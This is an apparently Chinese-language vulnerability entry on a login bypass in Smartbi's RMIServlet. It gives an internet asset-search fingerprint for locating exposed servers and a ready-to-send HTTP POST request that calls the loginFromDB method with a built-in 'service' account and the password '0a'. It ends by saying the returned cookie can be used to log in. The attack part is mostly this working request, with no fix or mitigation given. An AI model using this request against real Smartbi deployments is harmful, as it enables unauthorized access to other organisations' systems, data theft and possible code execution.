# smartbi RMIServlet 登陆绕过漏洞

## 漏洞描述

Smartbi在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。

## 漏洞影响

<a-checkbox checked>smartbi</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="SMARTBI"</a-checkbox></br>

## 漏洞复现

产品页面

![img](../../../.vuepress/public/img/1697869616391-78bb3b63-9a12-4276-a441-8d9c37cd939f.png)

验证POC

```php
POST /vision/RMIServlet HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded

className=UserService&methodName=loginFromDB&params=["service","0a"]
```

![img](../../../.vuepress/public/img/1697869636461-ab390dbf-5dd0-4be9-88dc-e94cd8fb0801.png)

通过获取的Cookie登陆